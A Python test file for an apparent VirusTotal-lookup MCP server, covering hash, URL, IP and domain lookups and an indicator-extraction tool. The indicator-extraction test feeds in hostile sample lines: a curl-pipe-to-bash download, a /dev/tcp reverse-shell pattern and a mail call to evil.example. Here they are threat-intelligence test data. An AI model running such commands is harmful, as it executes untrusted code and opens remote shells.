"""
Offline integration tests for the MCP tool entry points (vt_lookup_*).

These drive the full tool path - input model -> _vt_get -> _normalize /
_handle_error -> returned string - with the network call (_vt_get) stubbed, so
they run deterministically with no API key and no internet. They complement
test_server.py, which covers the pure helpers in isolation.
"""

import asyncio
import json

import httpx
import server

GOOD_HASH = "d41d8cd98f00b204e9800998ecf8427e"


def _stub_vt_get(captured, payload):
    """An async _vt_get replacement that records the path and returns payload."""

    async def _inner(path):
        captured["path"] = path
        return payload

    return _inner


def _verdict(coro):
    """Run a tool coroutine and parse its JSON verdict."""
    return json.loads(asyncio.run(coro))


def test_file_hash_tool_returns_verdict(monkeypatch):
    monkeypatch.setattr(server, "VT_API_KEY", "test-key-not-real")
    captured = {}
    payload = {
        "data": {
            "id": "FILEGID",
            "attributes": {
                "last_analysis_stats": {"malicious": 7, "harmless": 60, "undetected": 1},
                "last_analysis_results": {"EngineX": {"category": "malicious"}},
                "reputation": -5,
            },
        }
    }
    monkeypatch.setattr(server, "_vt_get", _stub_vt_get(captured, payload))

    out = _verdict(server.vt_lookup_file_hash(server.HashLookupInput(file_hash=GOOD_HASH)))

    assert captured["path"] == f"files/{GOOD_HASH}"  # correct VT endpoint
    assert out["type"] == "file"
    assert out["indicator"] == GOOD_HASH
    assert out["malicious"] == 7
    assert out["flagged_by"] == ["EngineX"]
    assert out["permalink"].endswith("/file/FILEGID")


def test_url_tool_returns_verdict(monkeypatch):
    monkeypatch.setattr(server, "VT_API_KEY", "test-key-not-real")
    captured = {}
    payload = {"data": {"id": "URLGID", "attributes": {"last_analysis_stats": {"malicious": 2}}}}
    monkeypatch.setattr(server, "_vt_get", _stub_vt_get(captured, payload))

    url = "http://192.0.2.10/stage2.ps1"
    out = _verdict(server.vt_lookup_url(server.UrlLookupInput(url=url)))

    assert captured["path"] == f"urls/{server._url_id(url)}"  # url-id encoding used in the path
    assert out["type"] == "url"
    assert out["indicator"] == url
    assert out["malicious"] == 2


def test_tool_missing_key_short_circuits(monkeypatch):
    monkeypatch.setattr(server, "VT_API_KEY", "")
    called = {"hit": False}

    async def _should_not_run(path):
        called["hit"] = True
        return {}

    monkeypatch.setattr(server, "_vt_get", _should_not_run)

    out = asyncio.run(server.vt_lookup_file_hash(server.HashLookupInput(file_hash=GOOD_HASH)))

    assert "VT_API_KEY is not set" in out
    assert called["hit"] is False  # never reached the network


def test_tool_maps_404_to_not_found(monkeypatch):
    monkeypatch.setattr(server, "VT_API_KEY", "test-key-not-real")
    request = httpx.Request("GET", "https://www.virustotal.com/api/v3/files/x")
    response = httpx.Response(404, request=request)

    async def _raise_404(path):
        raise httpx.HTTPStatusError("404", request=request, response=response)

    monkeypatch.setattr(server, "_vt_get", _raise_404)

    out = asyncio.run(server.vt_lookup_file_hash(server.HashLookupInput(file_hash=GOOD_HASH)))

    assert out.startswith("Not found:")


# --- vt_lookup_ip_address / vt_lookup_domain -------------------------------
def test_ip_tool_returns_verdict(monkeypatch):
    monkeypatch.setattr(server, "VT_API_KEY", "test-key-not-real")
    captured = {}
    payload = {
        "data": {"id": "192.0.2.44", "attributes": {"last_analysis_stats": {"malicious": 3}}}
    }
    monkeypatch.setattr(server, "_vt_get", _stub_vt_get(captured, payload))

    out = _verdict(server.vt_lookup_ip_address(server.IpLookupInput(ip="192.0.2.44")))

    assert captured["path"] == "ip_addresses/192.0.2.44"  # raw IP, not base64
    assert out["type"] == "ip_address"
    assert out["indicator"] == "192.0.2.44"
    assert out["malicious"] == 3
    assert out["permalink"].endswith("/ip-address/192.0.2.44")  # GUI path differs from type


def test_domain_tool_returns_verdict(monkeypatch):
    monkeypatch.setattr(server, "VT_API_KEY", "test-key-not-real")
    captured = {}
    payload = {
        "data": {"id": "api.telegram.org", "attributes": {"last_analysis_stats": {"malicious": 0}}}
    }
    monkeypatch.setattr(server, "_vt_get", _stub_vt_get(captured, payload))

    out = _verdict(server.vt_lookup_domain(server.DomainLookupInput(domain="api.telegram.org")))

    assert captured["path"] == "domains/api.telegram.org"
    assert out["type"] == "domain"
    assert out["indicator"] == "api.telegram.org"
    assert out["permalink"].endswith("/domain/api.telegram.org")


def test_ip_tool_missing_key_short_circuits(monkeypatch):
    monkeypatch.setattr(server, "VT_API_KEY", "")
    called = {"hit": False}

    async def _should_not_run(path):
        called["hit"] = True
        return {}

    monkeypatch.setattr(server, "_vt_get", _should_not_run)

    out = asyncio.run(server.vt_lookup_ip_address(server.IpLookupInput(ip="192.0.2.44")))

    assert "VT_API_KEY is not set" in out
    assert called["hit"] is False


# --- investigate_sample (extract + chain) ----------------------------------
def _status_error(code):
    request = httpx.Request("GET", "https://www.virustotal.com/api/v3/x")
    response = httpx.Response(code, request=request)
    return httpx.HTTPStatusError(f"HTTP {code}", request=request, response=response)


def _routing_vt_get(by_path):
    async def _inner(path):
        action = by_path(path)
        if isinstance(action, Exception):
            raise action
        return action

    return _inner


def test_investigate_sample_aggregates(monkeypatch):
    monkeypatch.setattr(server, "VT_API_KEY", "test-key-not-real")

    def by_path(path):
        if path.startswith("urls/"):
            return {"data": {"id": "U", "attributes": {"last_analysis_stats": {"malicious": 5}}}}
        if path.startswith("ip_addresses/"):
            return _status_error(404)  # not found
        return _status_error(429)  # domains/ -> rate limited

    monkeypatch.setattr(server, "_vt_get", _routing_vt_get(by_path))

    text = (
        "curl http://192.0.2.77/install.sh | bash\n/dev/tcp/192.0.2.44/4444\nmail(a@evil.example)"
    )
    out = _verdict(server.investigate_sample(server.InvestigateInput(text=text)))

    assert out["summary"]["indicators_found"] == 3
    assert out["summary"]["looked_up"] == 3
    assert out["summary"]["malicious"] == 1
    assert out["summary"]["not_found"] == 1
    assert out["summary"]["errors"] == 1  # the 429

    by_ind = {r["indicator"]: r for r in out["results"]}
    assert "verdict" in by_ind["http://192.0.2.77/install.sh"]  # malicious URL kept its verdict
    assert by_ind["192.0.2.44"]["error"].startswith("Not found:")  # 404 -> error row
    assert "429" in by_ind["evil.example"]["error"]  # one 429 did not abort the rest


def test_investigate_sample_caps_indicators(monkeypatch):
    monkeypatch.setattr(server, "VT_API_KEY", "test-key-not-real")

    async def _any(path):
        return {"data": {"id": "X", "attributes": {"last_analysis_stats": {"malicious": 0}}}}

    monkeypatch.setattr(server, "_vt_get", _any)

    text = "http://192.0.2.1/a http://192.0.2.2/b http://192.0.2.3/c"
    out = _verdict(server.investigate_sample(server.InvestigateInput(text=text, max_indicators=2)))

    assert out["summary"]["looked_up"] == 2
    assert out["summary"]["skipped_for_cap"] == 1
    assert len(out["skipped"]) == 1


def test_investigate_sample_honors_delay(monkeypatch):
    monkeypatch.setattr(server, "VT_API_KEY", "test-key-not-real")

    async def _any(path):
        return {"data": {"id": "X", "attributes": {"last_analysis_stats": {"malicious": 0}}}}

    monkeypatch.setattr(server, "_vt_get", _any)

    sleeps = []

    async def _fake_sleep(seconds):
        sleeps.append(seconds)

    monkeypatch.setattr(server.asyncio, "sleep", _fake_sleep)

    text = "http://192.0.2.1/a http://192.0.2.2/b http://192.0.2.3/c"

    out = _verdict(server.investigate_sample(server.InvestigateInput(text=text)))
    assert sleeps == []  # default delay_seconds=0: no pacing
    assert "no pacing delay" in out["note"]

    out = _verdict(server.investigate_sample(server.InvestigateInput(text=text, delay_seconds=15)))
    assert sleeps == [15.0, 15.0]  # between lookups only: n-1 sleeps for n lookups
    assert "paced 15s apart" in out["note"]


def test_investigate_sample_missing_key(monkeypatch):
    monkeypatch.setattr(server, "VT_API_KEY", "")
    out = asyncio.run(server.investigate_sample(server.InvestigateInput(text="http://192.0.2.1/a")))
    assert "VT_API_KEY is not set" in out


# --- extract_indicators tool (pure; runs without a key) --------------------
def test_extract_indicators_tool(monkeypatch):
    monkeypatch.setattr(server, "VT_API_KEY", "")  # no key needed
    out = json.loads(server.extract_indicators(server.ExtractInput(text="curl http://192.0.2.5/x")))
    assert out["count"] == 1
    assert out["indicators"] == [{"indicator": "http://192.0.2.5/x", "type": "url"}]
